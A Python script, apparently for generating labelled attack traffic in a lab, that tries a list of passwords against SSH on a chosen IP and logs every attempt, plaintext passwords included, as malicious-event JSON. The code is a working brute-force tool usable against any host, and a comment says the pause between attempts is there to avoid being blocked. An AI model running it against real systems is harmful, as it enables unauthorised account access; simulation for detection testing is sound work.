# scripts/brute_force_simulator.py
import paramiko
import json
from datetime import datetime
import os
import requests # Per get_local_ip
import time

# Funzione per ottenere l'IP locale (copiata per self-containment)
def get_local_ip():
    try:
        response = requests.get("http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip",
                                headers={"Metadata-Flavor": "Google"}, timeout=0.5)
        if response.status_code == 200:
            return response.text
    except requests.exceptions.RequestException:
        pass
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

LOCAL_IP = get_local_ip()

def simulate_ssh_brute_force(target_ip, username, passwords, log_file="/var/log/malicious_traffic.log"):
    """
    Simula un attacco brute-force SSH.
    Registra ogni tentativo e il risultato in un file di log JSON.
    """
    print(f"[Brute Force SSH] Starting brute-force on {target_ip} for user {username}...")

    os.makedirs(os.path.dirname(log_file), exist_ok=True)

    for password in passwords:
        timestamp = datetime.now().isoformat()
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=username, password=password, timeout=5)
            
            log_entry = {
                "timestamp": timestamp,
                "event_type": "Malicious_BruteForce_SSH",
                "source_ip": LOCAL_IP,
                "target_ip": target_ip,
                "target_port": 22,
                "protocol": "SSH",
                "username_attempted": username,
                "password_attempted": password, # ATTENZIONE: in un sistema reale, non loggare password!
                "status": "Success",
                "message": f"SSH brute-force succeeded with user {username} and password {password}"
            }
            print(f"[Brute Force SSH] SUCCESS: User {username}, Pass {password}")
            client.close()
            # In caso di successo, potresti voler terminare o provare un altro tipo di attacco
            # Forziamo un break qui per non continuare a provare con credenziali valide
            with open(log_file, "a") as f:
                f.write(json.dumps(log_entry) + "\n")
            return # Termina dopo il primo successo
            
        except paramiko.AuthenticationException:
            log_entry = {
                "timestamp": timestamp,
                "event_type": "Malicious_BruteForce_SSH",
                "source_ip": LOCAL_IP,
                "target_ip": target_ip,
                "target_port": 22,
                "protocol": "SSH",
                "username_attempted": username,
                "password_attempted": password,
                "status": "Failed_Auth",
                "message": f"SSH brute-force failed for user {username}, pass {password}: Authentication failed"
            }
            print(f"[Brute Force SSH] FAILED (Auth): User {username}, Pass {password}")
        except paramiko.SSHException as e:
            log_entry = {
                "timestamp": timestamp,
                "event_type": "Malicious_BruteForce_SSH",
                "source_ip": LOCAL_IP,
                "target_ip": target_ip,
                "target_port": 22,
                "protocol": "SSH",
                "username_attempted": username,
                "password_attempted": password,
                "status": "Failed_SSH",
                "error": str(e),
                "message": f"SSH error for user {username}, pass {password}: {e}"
            }
            print(f"[Brute Force SSH] FAILED (SSH Error): {e}")
        except ConnectionRefusedError:
            log_entry = {
                "timestamp": timestamp,
                "event_type": "Malicious_BruteForce_SSH",
                "source_ip": LOCAL_IP,
                "target_ip": target_ip,
                "target_port": 22,
                "protocol": "SSH",
                "username_attempted": username,
                "password_attempted": password,
                "status": "Failed_ConnectionRefused",
                "error": "Connection refused",
                "message": f"SSH brute-force failed: Connection refused by {target_ip}"
            }
            print(f"[Brute Force SSH] FAILED: Connection refused by {target_ip}")
            # Se la connessione è rifiutata, probabilmente l'host non è in ascolto su SSH o un firewall blocca.
            # Potrebbe non avere senso continuare con le altre password.
            with open(log_file, "a") as f:
                f.write(json.dumps(log_entry) + "\n")
            return
        except TimeoutError:
             log_entry = {
                "timestamp": timestamp,
                "event_type": "Malicious_BruteForce_SSH",
                "source_ip": LOCAL_IP,
                "target_ip": target_ip,
                "target_port": 22,
                "protocol": "SSH",
                "username_attempted": username,
                "password_attempted": password,
                "status": "Failed_Timeout",
                "error": "Connection timed out",
                "message": f"SSH brute-force failed: Connection to {target_ip} timed out"
            }
             print(f"[Brute Force SSH] FAILED: Connection to {target_ip} timed out")
             with open(log_file, "a") as f:
                f.write(json.dumps(log_entry) + "\n")
             return # Esci se timeout
        except Exception as e:
            log_entry = {
                "timestamp": timestamp,
                "event_type": "Malicious_BruteForce_SSH",
                "source_ip": LOCAL_IP,
                "target_ip": target_ip,
                "target_port": 22,
                "protocol": "SSH",
                "username_attempted": username,
                "password_attempted": password,
                "status": "Failed_Other",
                "error": str(e),
                "message": f"An unexpected SSH error occurred: {e}"
            }
            print(f"[Brute Force SSH] An unexpected SSH error occurred: {e}")
        
        with open(log_file, "a") as f:
            f.write(json.dumps(log_entry) + "\n")
        
        time.sleep(1) # Breve pausa tra i tentativi per evitare di essere bloccati

if __name__ == '__main__':
    # Esempio di utilizzo standalone per test locali
    test_passwords = ["wrongpass", "password123", "your_strong_password"] # Una di queste dovrebbe essere corretta per il test SSH
    simulate_ssh_brute_force("127.0.0.1", "testuser", test_passwords)